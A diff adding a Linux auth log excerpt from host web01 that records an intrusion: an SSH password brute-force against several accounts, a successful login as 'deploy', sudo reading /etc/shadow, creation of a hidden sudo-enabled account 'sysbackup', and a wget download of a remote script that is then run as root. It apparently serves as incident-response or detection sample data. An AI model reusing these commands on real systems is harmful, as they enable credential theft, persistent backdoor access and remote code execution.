@@ -1,0 +1,35 @@
+Oct  5 02:58:01 web01 CRON[1102]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct  5 02:58:01 web01 CRON[1102]: pam_unix(cron:session): session closed for user root
+Oct  5 03:12:01 web01 sshd[2210]: Failed password for invalid user admin from 203.0.113.45 port 51022 ssh2
+Oct  5 03:12:04 web01 sshd[2212]: Failed password for invalid user admin from 203.0.113.45 port 51030 ssh2
+Oct  5 03:12:07 web01 sshd[2214]: Failed password for invalid user test from 203.0.113.45 port 51041 ssh2
+Oct  5 03:12:10 web01 sshd[2216]: Failed password for invalid user test from 203.0.113.45 port 51048 ssh2
+Oct  5 03:12:13 web01 sshd[2218]: Failed password for invalid user oracle from 203.0.113.45 port 51055 ssh2
+Oct  5 03:12:17 web01 sshd[2220]: Failed password for root from 203.0.113.45 port 51063 ssh2
+Oct  5 03:12:20 web01 sshd[2222]: Failed password for root from 203.0.113.45 port 51070 ssh2
+Oct  5 03:12:23 web01 sshd[2224]: Failed password for root from 203.0.113.45 port 51077 ssh2
+Oct  5 03:12:27 web01 sshd[2226]: Failed password for root from 203.0.113.45 port 51084 ssh2
+Oct  5 03:12:31 web01 sshd[2228]: Failed password for deploy from 203.0.113.45 port 51090 ssh2
+Oct  5 03:12:35 web01 sshd[2230]: Failed password for deploy from 203.0.113.45 port 51101 ssh2
+Oct  5 03:12:39 web01 sshd[2232]: Failed password for deploy from 203.0.113.45 port 51112 ssh2
+Oct  5 03:12:44 web01 sshd[2234]: Accepted password for deploy from 203.0.113.45 port 51121 ssh2
+Oct  5 03:12:44 web01 sshd[2234]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Oct  5 03:13:02 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id
+Oct  5 03:13:02 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Oct  5 03:13:20 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Oct  5 03:13:41 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysbackup
+Oct  5 03:13:41 web01 useradd[2301]: new group: name=sysbackup, GID=1002
+Oct  5 03:13:41 web01 useradd[2301]: new user: name=sysbackup, UID=1002, GID=1002, home=/home/sysbackup, shell=/bin/bash, from=/dev/pts/0
+Oct  5 03:13:58 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo sysbackup
+Oct  5 03:13:58 web01 usermod[2310]: add 'sysbackup' to group 'sudo'
+Oct  5 03:13:58 web01 usermod[2310]: add 'sysbackup' to shadow group 'sudo'
+Oct  5 03:14:15 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/passwd sysbackup
+Oct  5 03:14:22 web01 passwd[2322]: pam_unix(passwd:chauthtok): password changed for sysbackup
+Oct  5 03:14:50 web01 sudo:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget -q http://198.51.100.23/update.sh -O /tmp/.update.sh
+Oct  5 03:15:02 web01 sudo:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/.update.sh
+Oct  5 03:15:40 web01 sshd[2234]: pam_unix(sshd:session): session closed for user deploy
+Oct  5 03:21:07 web01 sshd[2405]: Accepted publickey for sysbackup from 203.0.113.45 port 51310 ssh2: RSA SHA256:q3Xc8vRk2pLm9TzYw4HnB7dFs1eJuA6oKiG5rN0bVxE
+Oct  5 03:21:07 web01 sshd[2405]: pam_unix(sshd:session): session opened for user sysbackup(uid=1002) by (uid=0)
+Oct  5 08:02:15 web01 sshd[3120]: Accepted publickey for ana from 10.0.0.25 port 50122 ssh2: ED25519 SHA256:Lk7pW2sQx9vNm4RtYb6HcJ1dFg8eZuA3oKiT5rM0nXw
+Oct  5 08:02:15 web01 sshd[3120]: pam_unix(sshd:session): session opened for user ana(uid=1003) by (uid=0)
+Oct  5 08:03:01 web01 sudo:   ana : TTY=pts/1 ; PWD=/home/ana ; USER=root ; COMMAND=/usr/bin/apt update
